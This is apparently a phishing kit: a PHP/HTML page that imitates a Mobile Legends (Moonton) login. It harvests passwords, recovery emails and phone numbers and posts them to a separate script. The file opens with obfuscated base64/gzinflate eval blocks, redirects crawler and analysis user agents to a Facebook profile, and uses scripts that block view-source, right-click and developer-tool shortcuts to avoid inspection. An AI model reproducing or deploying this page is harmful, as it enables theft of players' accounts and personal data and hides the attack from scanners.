<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/RaBiitch1945');
die();
}
?>

<html lang="en">
	<head>
        <noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/RaBiitch1945"/></noscript>
		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Mobile Legends - Login</title>
        <link rel="shorcut icon" href="./img/favicon.ico" />
        <link rel="stylesheet" media="only screen and (min-width: 720px)" href="./css/style.css" />
        <link rel="stylesheet" media="only screen and (max-width: 720px)" href="./css/style.css" />
	</head>
	<body>
		<div class="form">
            <form role="form" action="aksimo.php" method="POST" name="login">
                <font color="#fff" style="letter-spacing: 1px;">Moonton Account</font><br/>
                <input type="text" name="momail" placeholder="UID / Username / Email" autofocus required tabindex="1" autocomplete="off"><br/>
                <input type="password" name="mopw" placeholder="Password" required tabindex="2"><p/>
                <font color="#fff" style="letter-spacing: 1px;">Account Details</font><br/>
                <input type="text" name="nick" placeholder="Nickname" required tabindex="7"><br/>
                <input type="number" name="lvl" placeholder="Acccount Level" required tabindex="8"><br/>
                <input type="number" name="skin" placeholder="Skins" required tabindex="9"><br/>
                <input type="email" name="recover" placeholder="Email Recovery" required tabindex="10" autocomplete="off"><br/>
                <input type="number" name="no" placeholder="Phone Number" required tabindex="11"><br/>
                <input type="text" name="country" placeholder="Country" required tabindex="12"><p/>
                <button type="submit" class="button button-block">Submit</button>
            </form>
        </div>
        <script>
            var txt="Login";
            var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
                txt=txt.substring(1,txt.length)+txt.charAt(0);
                segarkan=setTimeout("behenti()",kecepatan);}berhenti();
            document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
            document.onkeydown = function(e) {
                if (e.ctrlKey && 
                    (e.keyCode === 67 || 
                    e.keyCode === 83 || 
                    e.keyCode === 85 || 
                    e.keyCode === 117)) {
                    window.location.replace("index.html");
                return false;
                } else {
                     return true;
                }
            };
        </script>
        <!--Kode untuk mencegah shorcut keyboard, view source dll.-->
        <script type="text/javascript">
            window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
        </script>
        <script type="text/javascript">
            document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
        </script>
	</body>
</html>